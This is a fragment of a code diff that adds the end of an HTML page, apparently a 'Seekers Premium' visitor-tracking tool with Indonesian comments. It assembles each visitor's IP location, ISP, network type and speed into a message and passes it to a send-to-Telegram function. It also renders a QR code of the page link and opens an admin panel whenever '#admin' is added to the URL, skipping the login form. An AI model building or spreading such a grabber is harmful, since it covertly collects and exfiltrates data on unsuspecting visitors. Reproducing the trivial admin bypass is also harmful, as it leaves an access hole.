+Lokasi IP: ${document.getElementById('ipLocation').textContent}
+ISP: ${document.getElementById('isp').textContent}
+Tipe: ${document.getElementById('networkType').textContent}
+Kecepatan: ${document.getElementById('networkSpeed').textContent}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 SEEKERS PREMIUM • ONE AXE`;
+                
+                kirimKeTelegram(pesan);
+            }
+        }
+
+        // ===========================================
+        // QR CODE (TAMPIL DI ADMIN)
+        // ===========================================
+        new QRCode(document.getElementById("qrcode"), {
+            text: window.location.href,
+            width: 180,
+            height: 180,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.H
+        });
+
+        // ===========================================
+        // CEK APAKAH UDAH PERNAH LOGIN SEBELUMNYA
+        // ===========================================
+        window.onload = function() {
+            // Kalo ada hash #admin di URL, langsung buka admin (buat testing)
+            if (window.location.hash === '#admin') {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('mainContainer').style.display = 'block';
+            }
+        };
+    </script>
+</body>
+</html>
